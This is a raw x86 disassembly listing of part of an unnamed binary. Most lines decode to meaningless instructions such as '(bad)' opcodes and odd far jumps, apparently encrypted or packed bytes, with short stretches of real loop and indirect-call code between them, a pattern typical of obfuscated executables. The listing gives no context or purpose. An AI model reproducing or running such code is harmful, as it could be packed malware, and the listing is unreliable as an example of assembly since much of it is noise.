  403bf0:	lods   eax,DWORD PTR ds:[esi]
  403bf1:	or     BYTE PTR [edx+0x7c],ch
  403bf4:	fldcw  WORD PTR [ecx+0x8]
  403bf7:	nop
  403bf8:	aaa    
  403bf9:	out    0x36,eax
  403bfb:	pop    ecx
  403bfc:	mov    al,0xa3
  403bfe:	push   ebx
  403bff:	test   DWORD PTR [ebx-0x15cbfe4d],edi
  403c05:	add    eax,0x805262d6
  403c0a:	xchg   esp,eax
  403c0b:	pop    edi
  403c0c:	push   edx
  403c0d:	and    BYTE PTR ds:0x6e576560,ah
  403c13:	and    edi,DWORD PTR ds:0x450f6426
  403c19:	xchg   ecx,eax
  403c1a:	push   eax
  403c1b:	loopne 0x403beb
  403c1d:	mov    dl,0xd5
  403c1f:	push   ds
  403c20:	enter  0xa5a7,0xb6
  403c24:	mov    al,cl
  403c26:	int3   
  403c27:	or     ebx,DWORD PTR [edx+0x53]
  403c2a:	xor    ebp,DWORD PTR [esi+0x4d]
  403c2d:	cdq    
  403c2e:	mov    WORD PTR [esi+0x1eba8d45],gs
  403c34:	and    BYTE PTR [edx+ebp*4-0x44],0x18
  403c39:	jp     0x403c32
  403c3b:	add    ch,dh
  403c3d:	add    DWORD PTR [edi+0x2f12b4e1],0xeaf29d86
  403c47:	lods   eax,DWORD PTR ds:[esi]
  403c48:	push   esi
  403c49:	adc    BYTE PTR [edx-0x3eebd024],dl
  403c4f:	data16 es icebp 
  403c52:	das    
  403c53:	jmp    0x678d:0xfc8ef953
  403c5a:	pusha  
  403c5b:	dec    esi
  403c5c:	dec    esp
  403c5d:	inc    eax
  403c5e:	dec    ebx
  403c5f:	lods   al,BYTE PTR ds:[esi]
  403c60:	push   es
  403c61:	mov    al,0x97
  403c63:	(bad)  
  403c64:	jecxz  0x403ca7
  403c66:	mov    ds:0x38ca6f09,eax
  403c6b:	lock sub BYTE PTR [esi+0x49],al
  403c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c70:	lds    ebp,FWORD PTR [esi]
  403c72:	cli    
  403c73:	mov    ebx,0xe15e25a7
  403c78:	adc    eax,0x2a3ef830
  403c7d:	cmp    eax,0xe0c21319
  403c82:	cmp    BYTE PTR [edi-0x25],bh
  403c85:	mov    DWORD PTR [ebx],eax
  403c87:	xlat   BYTE PTR ds:[ebx]
  403c88:	scas   eax,DWORD PTR es:[edi]
  403c89:	jns    0x403c40
  403c8b:	cmp    eax,0x4d95227b
  403c90:	adc    dl,BYTE PTR [ecx-0x3dc0972c]
  403c96:	rol    BYTE PTR [edi+ebx*8],cl
  403c99:	add    al,dh
  403c9b:	enter  0xf608,0x66
  403c9f:	in     eax,dx
  403ca0:	add    esi,eax
  403ca2:	(bad)
  403ca6:	lods   al,BYTE PTR ds:[esi]
  403ca7:	cmp    eax,0x3cb541ae
  403cac:	sti    
  403cad:	sahf   
  403cae:	pop    ecx
  403caf:	cmp    ah,bh
  403cb1:	and    eax,0x2a1545e5
  403cb6:	and    eax,0x5fdc9a4c
  403cbb:	inc    ecx
  403cbc:	dec    edi
  403cbd:	dec    edx
  403cbe:	lock push eax
  403cc0:	sub    eax,0xa0de8293
  403cc5:	popa   
  403cc6:	rol    DWORD PTR [ecx-0x379f177f],0xb6
  403ccd:	sti    
  403cce:	aas    
  403ccf:	into   
  403cd0:	test   al,0x59
  403cd2:	cmp    ebx,DWORD PTR [ebp-0x581bc327]
  403cd8:	xor    eax,0x737dd2ea
  403cdd:	push   esi
  403cde:	icebp  
  403cdf:	cwde   
  403ce0:	jecxz  0x403cb0
  403ce2:	and    al,0xe9
  403ce4:	aam    0x68
  403ce6:	sub    BYTE PTR [edi],dl
  403ce8:	cmp    al,0xb3
  403cea:	xchg   ebp,eax
  403ceb:	push   esi
  403cec:	add    eax,0x93016f4e
  403cf1:	mov    cl,0xdf
  403cf3:	and    dh,BYTE PTR [edi-0x38]
  403cf6:	mov    al,0xb7
  403cf8:	jmp    0x85275431
  403cfd:	push   ecx
  403cfe:	xchg   edi,eax
  403cff:	stos   BYTE PTR es:[edi],al
  403d00:	push   0x6bbc49da
  403d05:	bound  edx,QWORD PTR [edi-0x6e8a42dd]
  403d0b:	add    BYTE PTR [ecx],bl
  403d0d:	xchg   esp,eax
  403d0e:	mov    BYTE PTR ds:0xd103ed9c,ah
  403d14:	and    DWORD PTR ds:0x424732,0x0
  403d1e:	mov    ebx,DWORD PTR ds:0x424732
  403d24:	inc    ebx
  403d25:	mov    DWORD PTR ds:0x424732,ebx
  403d2b:	cmp    DWORD PTR ds:0x424732,0x1a
  403d32:	jne    0x403d41
  403d38:	push   DWORD PTR [ebp-0xc]
  403d3b:	call   DWORD PTR ds:0x44200c
  403d41:	cmp    DWORD PTR ds:0x424732,0x12
  403d48:	jb     0x403d1e
  403d4e:	add    ebx,DWORD PTR ds:0x44798c
  403d54:	imul   edx,edi
  403d57:	mov    edi,DWORD PTR [ebp-0x8]
  403d5a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d5d:	sbb    DWORD PTR ds:0x44a6e0,0x3f1a
  403d67:	sub    ebx,edi
  403d69:	cmp    ebx,edx
  403d6b:	ja     0x403d93
  403d71:	add    edx,DWORD PTR ds:0x41074b
  403d77:	mov    edx,DWORD PTR [ebp-0x4]
  403d7a:	xor    edx,eax
  403d7c:	not    DWORD PTR ds:0x44d40c
  403d82:	add    edx,ecx
  403d84:	mov    DWORD PTR ds:0x44d418,0x3a6f
  403d8e:	jmp    0x4047a2
  403d93:	movzx  ebx,WORD PTR ds:0x44a6d4
  403d9a:	or     DWORD PTR ds:0x447990,ebx
  403da0:	mov    edx,DWORD PTR [ebp-0x2c]
  403da3:	mov    DWORD PTR ds:0x447994,0x16
  403dad:	cmp    DWORD PTR ds:0x447994,0x0
  403db4:	je     0x403e6e
  403dba:	cmp    DWORD PTR ds:0x447994,0x20
  403dc1:	jne    0x403dd5
  403dc7:	push   DWORD PTR [ebp-0x18]
  403dca:	push   0x4107a9
  403dcf:	call   DWORD PTR ds:0x44235c
  403dd5:	mov    ebx,DWORD PTR ds:0x447994
  403ddb:	dec    ebx
  403ddc:	mov    DWORD PTR ds:0x447994,ebx
  403de2:	jmp    0x403dad
  403de7:	and    DWORD PTR ds:0x42472e,0x0
  403df1:	jmp    0x403e03
  403df6:	mov    ebx,DWORD PTR ds:0x42472e
  403dfc:	inc    ebx
  403dfd:	mov    DWORD PTR ds:0x42472e,ebx
  403e03:	cmp    DWORD PTR ds:0x42472e,0x1c
  403e0a:	jae    0x403e6e
  403e10:	cmp    DWORD PTR ds:0x42472e,0xc
  403e17:	jne    0x403e4f
  403e1d:	push   DWORD PTR [ebp-0x10]
  403e20:	push   0x1816
  403e25:	push   DWORD PTR [ebp-0x28]
  403e28:	push   0x7e95
  403e2d:	push   0x4109
  403e32:	push   0x336d
  403e37:	push   0x1411
  403e3c:	push   DWORD PTR [ebp-0x20]
  403e3f:	push   0x7b8b
  403e44:	push   0x3268
  403e49:	call   DWORD PTR ds:0x4420d8
  403e4f:	cmp    DWORD PTR ds:0x42472e,0xb
  403e56:	jne    0x403e69
  403e5c:	mov    ebx,DWORD PTR ds:0x42472e
  403e62:	inc    ebx
  403e63:	mov    DWORD PTR ds:0x42472e,ebx
  403e69:	jmp    0x403df6
  403e6e:	mov    edi,DWORD PTR [ebp-0x4]
  403e71:	xor    edx,eax
  403e73:	xor    edi,eax
  403e75:	add    edi,ecx
  403e77:	add    edx,ecx
  403e79:	imul   edx,edi
  403e7c:	mov    edi,DWORD PTR [ebp-0x8]
  403e7f:	mov    ebx,DWORD PTR [ebp-0x10]
  403e82:	sub    ebx,edi
  403e84:	cmp    ebx,edx
  403e86:	ja     0x403e94
  403e8c:	mov    edx,DWORD PTR [ebp-0x28]
  403e8f:	jmp    0x40462f
  403e94:	mov    edx,DWORD PTR [ebp-0x30]
  403e97:	mov    edi,DWORD PTR [ebp-0x4]
  403e9a:	jmp    0x403fff
  403e9f:	dec    ebp
  403ea0:	xchg   esp,eax
  403ea1:	(bad)  
  403ea2:	call   0xa99e390c
  403ea7:	sub    ah,ah
  403ea9:	adc    al,0xc3
  403eab:	lock mov ecx,0x195e15dd
  403eb1:	jl     0x403f2f
  403eb3:	xor    al,0x7f
  403eb5:	jl     0x403f33
  403eb7:	test   eax,0xe6977d0
  403ebc:	dec    esp
  403ebd:	das    
  403ebe:	sbb    BYTE PTR [ecx+0x68],cl
  403ec1:	frndint 
  403ec3:	aad    0x4a
  403ec5:	out    dx,eax
  403ec6:	cmp    bl,dh
  403ec8:	xchg   ebx,eax
  403ec9:	inc    esp
  403eca:	and    al,0x3e
  403ecc:	scas   eax,DWORD PTR es:[edi]
  403ecd:	dec    esi
  403ece:	pop    ebp
  403ecf:	jmp    0x403edf
  403ed1:	add    bl,dl
  403ed3:	or     esi,eax
  403ed5:	addr16 jo 0x403e5d
  403ed8:	mov    WORD PTR [ecx],?
  403eda:	sbb    BYTE PTR [ebx+0x1804fa6a],dl
  403ee0:	cmc    
  403ee1:	add    BYTE PTR [edx+0x5e],al
  403ee4:	cwde   
  403ee5:	sbb    dl,BYTE PTR [eax]
  403ee7:	loope  0x403e8e
  403ee9:	fild   DWORD PTR [edx]
  403eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eec:	repnz bswap edx
  403eef:	pop    ebp
  403ef0:	sar    ah,1
  403ef2:	cmp    eax,0x32fa42de
  403ef7:	icebp  
  403ef8:	repz jne 0x403f0c
  403efb:	and    BYTE PTR [edi-0x6b792658],dl
  403f01:	mov    dh,0x35
  403f03:	push   ss
  403f04:	retf   
  403f05:	sbb    al,0x3b
  403f07:	cdq    
  403f08:	popa   
  403f09:	sbb    eax,0x7d348916
  403f0e:	cdq    
  403f0f:	mov    ah,0xd9
  403f11:	mov    ah,0x30
  403f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f14:	push   ds
  403f15:	test   bh,bl
  403f17:	cwde   
  403f18:	sbb    eax,0x9a06f590
  403f1d:	mov    esi,0x5f428ed9
  403f22:	xchg   ecx,eax
  403f23:	jae    0x403eff
  403f25:	jbe    0x403ebf
  403f27:	cmp    DWORD PTR [eax],eax
  403f29:	jae    0x403f62
  403f2b:	arpl   WORD PTR ds:0xa7a471a9,ax
  403f31:	pushf  
  403f32:	pop    ds
  403f33:	repz and eax,0x229454d
  403f39:	scas   al,BYTE PTR es:[edi]
  403f3a:	jno    0x403f8e
  403f3c:	repnz out dx,eax
  403f3e:	mov    esp,0x44c96419
  403f43:	xchg   edi,eax
  403f44:	push   esi
  403f45:	enter  0x6a7e,0x2c
  403f49:	mov    bh,BYTE PTR [esi]
  403f4b:	into   
  403f4c:	mov    esp,0xb3d7a039
  403f51:	cmp    eax,0x2c322eaf
  403f56:	dec    esi
  403f57:	div    DWORD PTR [esi+0x7a]
  403f5a:	mov    DWORD PTR [edx-0x5422948c],edi
  403f60:	mov    ebp,0x48bbe1fe
  403f65:	fimul  WORD PTR [ebx-0x4fb750b8]
  403f6b:	mov    dh,0xb8
  403f6d:	or     BYTE PTR [ecx-0x80],dh
  403f70:	cmp    BYTE PTR [eax+0x7],bl
  403f73:	es (bad) 
  403f75:	jg     0x403fc7
  403f77:	inc    edx
  403f78:	or     al,0x49
  403f7a:	mov    edi,edx
  403f7c:	xchg   ebp,eax
  403f7d:	(bad)  
  403f7e:	mov    dh,0x86
  403f80:	add    BYTE PTR [edx-0x47],ch
  403f83:	and    al,BYTE PTR [esi+0x7d]
  403f86:	repz pop edx
  403f88:	sub    bl,bl
  403f8a:	fwait
  403f8b:	jo     0x403f16
  403f8d:	xchg   BYTE PTR [edx-0x55],dl
  403f90:	sub    al,0x2b
  403f92:	stos   BYTE PTR es:[edi],al
  403f93:	xchg   ebp,eax
  403f94:	jo     0x403f45
  403f96:	loopne 0x403faa
  403f98:	jno    0x403f1a
  403f9a:	mov    ds:0x738b5479,al
  403f9f:	lds    ebp,FWORD PTR [edi-0x72]
  403fa2:	jp     0x403ff1
  403fa4:	push   0x14c4bffe
  403fa9:	xor    bh,BYTE PTR [edi]
  403fab:	jp     0x403f38
  403fad:	xor    al,BYTE PTR [ebx-0x213401ef]
  403fb3:	add    al,0xf2
  403fb5:	pusha  
  403fb6:	test   DWORD PTR [ecx],edi
  403fb8:	lea    esi,[ebp-0xb3309e2]
  403fbe:	jnp    0x403f42
  403fc0:	xor    al,0xb5
  403fc2:	mov    dh,0x63
  403fc4:	inc    eax
  403fc5:	jb     0x403fef
  403fc7:	mov    ebx,0x43f44226
  403fcc:	pop    ebp
  403fcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fce:	cmp    ah,BYTE PTR [edx+0xdfc499f]
  403fd4:	imul   eax,DWORD PTR [ecx-0x5f],0xc379020e
  403fdb:	sbb    ebx,DWORD PTR [ebp+edx*1-0x10]
  403fdf:	push   esp
  403fe0:	outs   dx,DWORD PTR ds:[esi]
  403fe1:	sub    al,0xe6
  403fe3:	pop    edi
  403fe4:	jecxz  0x40405a
  403fe6:	dec    eax
  403fe7:	cmp    edi,esi
  403fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fea:	test   DWORD PTR [edi+0x3f],ecx
  403fed:	inc    esp
  403fee:	pushf  
  403fef:	call   DWORD PTR [eax-0x4]
  403ff2:	add    DWORD PTR ds:0x1d993f46,edx
  403ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff9:	sub    cl,BYTE PTR [ebp+0x19c1de66]
  403fff:	xor    edx,eax
  404001:	xor    edi,eax
  404003:	add    edi,ecx
  404005:	add    edx,ecx
  404007:	imul   edx,edi
  40400a:	mov    edi,DWORD PTR [ebp-0x8]
  40400d:	mov    ebx,DWORD PTR [ebp-0x10]
  404010:	sub    ebx,edi
  404012:	cmp    ebx,edx
  404014:	ja     0x404022
  40401a:	mov    edx,DWORD PTR [ebp-0x2c]
  40401d:	jmp    0x40462f
  404022:	mov    edx,DWORD PTR [ebp-0x34]
  404025:	mov    edi,DWORD PTR [ebp-0x4]
  404028:	xor    edx,eax
  40402a:	xor    edi,eax
  40402c:	add    edi,ecx
  40402e:	add    edx,ecx
  404030:	imul   edx,edi
  404033:	mov    edi,DWORD PTR [ebp-0x8]
  404036:	mov    ebx,DWORD PTR [ebp-0x10]
  404039:	sub    ebx,edi
  40403b:	cmp    ebx,edx
  40403d:	jmp    0x4041a2
  404042:	sbb    DWORD PTR [edx+ecx*2],esi
  404045:	cs pop ebp
  404047:	mov    ds:0xe1ed77d,al
  40404c:	cmovae esi,DWORD PTR [edi]
  40404f:	ficom  DWORD PTR [edi+0x7c1b16e4]
  404055:	jl     0x40408b
  404057:	jg     0x4040d5
  404059:	jl     0x40405d
  40405b:	xor    al,0x59
  40405d:	nop
  40405e:	dec    esp
  40405f:	inc    edx
  404060:	and    DWORD PTR [ebx],ebx
  404062:	ins    DWORD PTR es:[edi],dx
  404063:	sbb    ecx,ebp
  404065:	ja     0x404083
  404067:	or     eax,edi
  404069:	fwait
  40406a:	shl    bl,cl
  40406c:	ss call 0xffdf:0x8a29b9d7
  404074:	stos   BYTE PTR es:[edi],al
  404075:	jbe    0x4040ad
  404077:	fdiv   DWORD PTR [esi]
  404079:	cdq    
  40407a:	jge    0x4040ed
  40407c:	js     0x4040ec
  40407e:	clc    
  40407f:	cld    
  404080:	clc    
  404081:	(bad)  
  404082:	dec    ebx
  404083:	jge    0x404074
  404085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404086:	mov    ah,0xd6
  404088:	mov    ch,0xf2
  40408a:	pop    ds
  40408b:	mov    esi,0xf992431d
  404090:	in     eax,dx
  404091:	loopne 0x40402e
  404093:	fwait
  404094:	dec    edx
  404095:	arpl   WORD PTR [esi-0x11],bp
  404098:	sti    
  404099:	fwait
  40409a:	push   cs
  40409b:	retf   0xce94
  40409e:	mov    bh,0xb5
  4040a0:	mov    esp,0x17fff988
  4040a5:	cmp    BYTE PTR [eax+0x5df459e1],ch
  4040ab:	lock mov cs,WORD PTR [edi-0x2c]
  4040af:	mov    al,ds:0x12ff813b
  4040b4:	repnz mov cl,0x53
  4040b7:	ds xor eax,0x1b5c92ae
  4040bd:	pop    eax
  4040be:	jle    0x40408b
  4040c0:	scas   eax,DWORD PTR es:[edi]
  4040c1:	sar    DWORD PTR ds:0x21d4f026,1
  4040c7:	mov    esi,0xe62cf474
  4040cc:	call   0x52d82ffa
  4040d1:	daa    
  4040d2:	inc    eax
  4040d3:	out    0x62,eax
  4040d5:	mov    BYTE PTR [edi+ecx*1],al
  4040d8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4040da:	js     0x404126
  4040dc:	outs   dx,BYTE PTR ds:[esi]
  4040dd:	dec    esi
  4040de:	jae    0x4040b4
  4040e0:	sub    al,0xd0
  4040e2:	sbb    al,0xb2
  4040e4:	pop    ecx
  4040e5:	mov    ch,0x74
  4040e7:	in     al,0xb2
  4040e9:	test   al,0xa
  4040eb:	les    esi,FWORD PTR [edi-0x6b3b11fa]
  4040f1:	inc    esp
  4040f2:	in     eax,dx
  4040f3:	inc    eax
  4040f4:	mov    eax,esp
  4040f6:	xchg   BYTE PTR [ecx+eax*2],ah
  4040f9:	push   ds
  4040fa:	icebp  
  4040fb:	and    eax,0xca194970
  404100:	dec    esp
  404101:	cmc    
  404102:	enter  0x6c40,0x8f
  404106:	jb     0x40413b
  404108:	out    0xdb,eax
  40410a:	cs je  0x404118
  40410d:	sbb    al,0x60
  40410f:	cmp    dh,BYTE PTR [esi+edi*4+0x36]
  404113:	mov    ah,0x73
  404115:	sti    
  404116:	jge    0x4040e5
  404118:	retf   0x4b55
  40411b:	jmp    0x4040e3
  40411d:	in     eax,dx
  40411e:	sbb    BYTE PTR ds:0x24aee630,bl
  404124:	inc    ebx
  404125:	call   0xfaef:0xe1e9b146
  40412c:	ins    DWORD PTR es:[edi],dx
  40412d:	and    BYTE PTR [edi-0x26],ah
  404130:	neg    eax
  404132:	vdivps xmm2,xmm1,XMMWORD PTR [ecx]
  404136:	pop    esi
  404137:	cmp    ah,dh
  404139:	mov    ah,0xb6
  40413b:	push   esi
  40413c:	test   BYTE PTR [edi-0x1b6876ad],cl
  404142:	and    eax,0x8e990f5e
  404147:	ret    0xd802
  40414a:	(bad)  
  40414b:	or     DWORD PTR [eax+eiz*4+0x6ab93ac3],ecx
  404152:	pop    edi
  404153:	sahf   
  404154:	dec    ebp
  404155:	pop    ecx
  404156:	test   esp,eax
  404158:	in     eax,dx
  404159:	add    ebx,DWORD PTR [edx+ebx*4-0x66]
  40415d:	mov    esi,0x2c7a0d96
  404162:	push   ecx
  404163:	shr    cl,cl
  404165:	mov    bl,0xba
  404167:	hlt    
  404168:	(bad)  
  404169:	xor    al,0x70
  40416b:	shl    ebx,0x93
  40416e:	rol    DWORD PTR [ecx+edi*4+0x1af4ea37],0x1a
  404176:	xlat   BYTE PTR ds:[ebx]
  404177:	and    eax,0x96a224a3
  40417c:	cmp    DWORD PTR [ebp-0xd],0xd9ff3829
  404183:	inc    edx
  404184:	or     al,bh
  404186:	inc    ebx
  404187:	std    
  404188:	xor    DWORD PTR [edi],edx
  40418a:	adc    BYTE PTR [edx+0xbed79fc],dl
  404190:	loopne 0x404202
  404192:	xor    DWORD PTR [edx+0x7a],ecx
  404195:	fisttp QWORD PTR [esi]
  404198:	pop    ds
  404199:	sbb    DWORD PTR [ebp-0x831c4c6],0xf5a175a
  4041a3:	xchg   DWORD PTR [eax],ecx
  4041a5:	add    BYTE PTR [eax],al
  4041a7:	add    BYTE PTR [ebx+0x7fe9d055],cl
  4041ad:	add    al,0x0
  4041af:	add    BYTE PTR [ebx+0x7d8bc855],cl
  4041b5:	cld    
  4041b6:	xor    edx,eax
  4041b8:	xor    edi,eax
  4041ba:	jmp    0x40431f
  4041bf:	dec    ecx
  4041c0:	inc    ebx
  4041c1:	fdivr  st,st(0)
  4041c3:	fidivr DWORD PTR [ebx+0x69]
  4041c6:	gs jge 0x40418a
  4041c9:	shr    ebx,cl
  4041cb:	xchg   edi,eax
  4041cc:	iret   
  4041cd:	jge    0x404217
  4041cf:	out    dx,al
  4041d0:	sbb    bh,BYTE PTR [esp+edi*2+0x34]
  4041d4:	jg     0x404252
  4041d6:	jl     0x404228
  4041d8:	xchg   esi,eax
  4041d9:	xor    bl,BYTE PTR [ebx+0x6feef17a]
  4041df:	mov    ch,0xfb
  4041e1:	clc    
  4041e2:	js     0x40416e
  4041e4:	push   eax
  4041e5:	mov    eax,eax
  4041e7:	test   DWORD PTR [ebx+0x23],ebx
  4041ea:	dec    eax
  4041eb:	icebp  
  4041ec:	sbb    cl,BYTE PTR [eax-0x2]
  4041ef:	jl     0x404210
  4041f1:	inc    BYTE PTR [esi]
  4041f3:	fild   DWORD PTR [edi]
  4041f5:	fistp  DWORD PTR [ebx-0x9173b34]
  4041fb:	out    dx,al
  4041fc:	loop   0x404213
  4041fe:	shl    BYTE PTR [edx],1
  404200:	out    0x3f,eax
  404202:	mov    ds:0x7f5bff93,eax
  404207:	es in  al,dx
  404209:	fdivp  st(2),st
  40420b:	pop    eax
  40420c:	stc    
  40420d:	fs pop ss
  40420f:	repnz mov esi,ecx
  404212:	jge    0x404218
  404214:	mov    bl,BYTE PTR [eax+0x50]
  404217:	(bad)
  40421a:	jg     0x4041fd
  40421c:	xchg   esi,eax
  40421d:	sbb    dh,al
  40421f:	enter  0x6937,0x87
  404223:	stos   DWORD PTR es:[edi],eax
  404224:	xchg   BYTE PTR [eax],bh
  404226:	push   ebx
  404227:	leave  
  404228:	mov    bl,0x76
  40422a:	xor    eax,DWORD PTR [esi]
  40422c:	jns    0x404248
  40422e:	fiadd  WORD PTR [eax-0x4c]
  404231:	jmp    0x1e5f625b
  404236:	loopne 0x40424f
  404238:	mov    ebx,0x9befc386
  40423d:	enter  0xf938,0x96
  404241:	sbb    ah,BYTE PTR [edi+0x525711d1]
  404247:	sbb    BYTE PTR [ebp-0x48d9cd78],cl
  40424d:	in     al,dx
  40424e:	push   edi
  40424f:	dec    eax
  404250:	ret    
  404251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404252:	sub    edx,DWORD PTR [ebp-0x22]
  404255:	sbb    al,0xd5
  404257:	neg    BYTE PTR [eax+0x6558b1d0]
  40425d:	xchg   ebx,eax
  40425e:	dec    esp
  40425f:	es jne 0x40424d
  404262:	sbb    esp,esi
  404264:	(bad)  
  404265:	pop    ebx
  404266:	mov    bl,0x40
  404268:	sysret 
  40426a:	add    eax,0xcdfd3b1f
  40426f:	sti    
  404270:	sub    al,BYTE PTR [edx-0x1ed9665d]
  404276:	adc    al,0xa1
  404278:	call   0xf5596912
  40427d:	push   0xfdf08676
  404282:	dec    esp
  404283:	mov    eax,ds:0xcd5c033d
  404288:	lea    esi,[esi+0x1e]
  40428b:	or     DWORD PTR [ecx+0x45],eax
  40428e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40428f:	mov    al,0x70
  404291:	popf   
  404292:	push   esi
  404293:	ficom  WORD PTR [eax+ecx*4-0x231e8d1c]
  40429a:	inc    dx
  40429c:	pop    ss
  40429d:	ror    DWORD PTR [ecx+0x69],1
  4042a0:	xor    eax,0x4bc12e10
  4042a5:	push   edi
  4042a6:	adc    esp,0xffffffaf
  4042a9:	jmp    0x40427e
  4042ab:	int3   
  4042ac:	fmul   DWORD PTR [ecx]
  4042ae:	mov    dl,cl
  4042b0:	sahf   
  4042b1:	pop    esi
  4042b2:	fisttp WORD PTR [esi+0x77d7e6d9]
  4042b8:	test   al,0xb9
  4042ba:	jl     0x40424b
  4042bc:	mov    ds:0x45bead27,al
  4042c1:	push   edi
  4042c2:	mov    eax,ds:0x8b1484f7
  4042c7:	repnz lds edi,FWORD PTR [ebx-0x7d9e8a9f]
  4042ce:	retf   0xec2c
  4042d1:	jb     0x404341
  4042d3:	ret    
  4042d4:	mov    eax,0xc8bb58b7
  4042d9:	jmp    0x3611:0x8c78e41d
  4042e0:	test   edi,ebp
  4042e2:	mov    ch,0x3b
  4042e4:	ret    
  4042e5:	push   es
  4042e6:	shr    DWORD PTR [esi],cl
  4042e8:	adc    BYTE PTR [edi+0xc418a2d],ah
  4042ee:	sbb    ecx,DWORD PTR [esi-0x7d92a268]
  4042f4:	test   al,0x33
  4042f6:	rcr    DWORD PTR [ebp-0x7027d65e],1
  4042fc:	or     eax,0xedc9551d
  404301:	mov    ebp,0x66c8294
  404306:	pusha  
  404307:	jmp    0x818f:0xe2eda355
  40430e:	(bad)  
  40430f:	int    0x56
  404311:	loop   0x40437c
  404313:	fwait
  404314:	sbb    DWORD PTR [ebp+0x3d],edx
  404317:	inc    si
  404319:	inc    esp
  40431a:	mov    esp,0xf8bc830d
  40431f:	add    edi,ecx
  404321:	add    edx,ecx
  404323:	imul   edx,edi
  404326:	mov    edi,DWORD PTR [ebp-0x8]
  404329:	jmp    0x40448e
  40432e:	fwait
  40432f:	bound  esp,QWORD PTR [edi]
  404331:	pushf  
  404332:	stc    
  404333:	ins    DWORD PTR es:[edi],dx
  404334:	fwait
  404335:	jge    0x4042bf
  404337:	les    ecx,FWORD PTR [ebp+0x29]
  40433a:	dec    esp
  40433b:	xchg   esi,eax
  40433c:	sbb    ah,bl
  40433e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40433f:	sbb    eax,0x7f347c7c
  404344:	jl     0x4043c2
  404346:	jmp    0xb74c:0x78a3b857
  40434d:	icebp  
  40434e:	js     0x40433b
  404350:	push   cs
  404351:	jmp    0xf81d:0xd011fc4
  404358:	test   al,0x40
  40435a:	scas   eax,DWORD PTR es:[edi]
  40435b:	in     al,0xea
  40435d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40435e:	pop    ecx
  40435f:	mov    bh,0xc6
  404361:	push   0x15
  404363:	rcl    BYTE PTR ds:0x3aa7f315,cl
  404369:	push   ebp
  40436a:	cdq    
  40436b:	add    BYTE PTR [eax+0x26],al
  40436e:	nop
  40436f:	mov    cl,0x51
  404371:	dec    edx
  404372:	lds    esp,FWORD PTR [bp+si-0x22]
  404376:	enter  0x7bd9,0xf3
  40437a:	jecxz  0x40430b
  40437c:	ret    0x6126
  40437f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404380:	clc    
  404381:	push   ebx
  404382:	add    BYTE PTR [esi+0x5b012391],dh
  404388:	pop    es
  404389:	push   ecx
  40438a:	loopne 0x4043ce
  40438c:	xor    DWORD PTR [edx+0x6dbc216c],esi
  404392:	stc    
  404393:	daa    
  404394:	mov    ebx,0xf00a739c
  404399:	mov    BYTE PTR [esi+0x36],bh
  40439c:	leave  
  40439d:	mov    cl,BYTE PTR [ecx]
  40439f:	push   ebp
  4043a0:	mov    edi,ecx
  4043a2:	div    BYTE PTR [eax]
  4043a4:	mov    edi,0x6eb1c5a7
  4043a9:	sub    BYTE PTR [ebx],ch
  4043ab:	jecxz  0x404391
  4043ad:	data16 rol BYTE PTR [esi],cl
  4043b0:	sub    eax,0x460d5075
  4043b5:	and    al,0xc6
  4043b7:	(bad)  
  4043b9:	icebp  
  4043ba:	xor    al,0x67
  4043bc:	gs inc edx
  4043be:	std    
  4043bf:	mov    al,BYTE PTR [edi-0x6b]
  4043c2:	and    esi,DWORD PTR [edi-0x620c8a02]
  4043c8:	sbb    al,0x77
  4043ca:	(bad)  
  4043cb:	adc    al,0xbf
  4043cd:	cmp    eax,0x9ab0f340
  4043d2:	es mov esi,0xf94b373f
  4043d8:	in     al,0x20
  4043da:	icebp  
  4043db:	ins    BYTE PTR es:[edi],dx
  4043dc:	or     esi,DWORD PTR [esi+ecx*4]
  4043df:	xchg   edi,eax
  4043e0:	cli    
  4043e1:	sub    esi,DWORD PTR [esi-0x27707105]
  4043e7:	nop
  4043e8:	mov    ds:0xaf8ff69c,al
  4043ed:	iret   
  4043ee:	ret    0xcc98
  4043f1:	or     cl,bh
  4043f3:	cld    
  4043f4:	call   0xbee8:0xff112828
  4043fb:	dec    edi
  4043fc:	sbb    DWORD PTR [edi+0x3b],0xffffff98
  404400:	mov    ch,0xb3
  404402:	das    
  404403:	xchg   ebp,eax
  404404:	xchg   edx,eax
  404405:	sbb    ch,BYTE PTR [eax+0xc]
  404408:	jecxz  0x404475
  40440a:	fwait
  40440b:	ins    BYTE PTR es:[edi],dx
  40440c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40440e:	jecxz  0x404462
  404410:	and    ch,BYTE PTR [edx-0x1582aa80]
  404416:	and    DWORD PTR [ebx+0x11],0xc2356bd0
  40441d:	dec    ebx
  40441e:	and    esi,DWORD PTR [esp+esi*8+0x2c]
  404422:	cli    
  404423:	mov    al,0x6f
  404425:	add    al,0x1c
  404427:	(bad)  
  404429:	fwait
  40442a:	dec    ecx
  40442b:	mov    edi,0xc90996dc
  404430:	imul   BYTE PTR [ebp+ebp*8+0x45]
  404434:	pop    esp
  404435:	jno    0x404449
  404437:	or     eax,0x77a8a3c1
  40443c:	repz inc ebp
  40443e:	mov    edi,0x9999d313
  404443:	inc    ecx
  404444:	aaa    
  404445:	jle    0x404476
  404447:	inc    edx
  404448:	adc    edi,DWORD PTR [ebx]
  40444a:	add    BYTE PTR [edi],dh
  40444c:	outs   dx,DWORD PTR ds:[esi]
  40444d:	scas   eax,DWORD PTR es:[edi]
  40444e:	push   cs
  40444f:	adc    BYTE PTR es:[eax],bl
  404452:	std    
  404453:	(bad)  
  404454:	scas   al,BYTE PTR es:[edi]
  404455:	ins    DWORD PTR es:[edi],dx
  404456:	jne    0x4044aa
  404458:	lods   al,BYTE PTR ds:[esi]
  404459:	in     al,dx
  40445a:	xchg   esi,eax
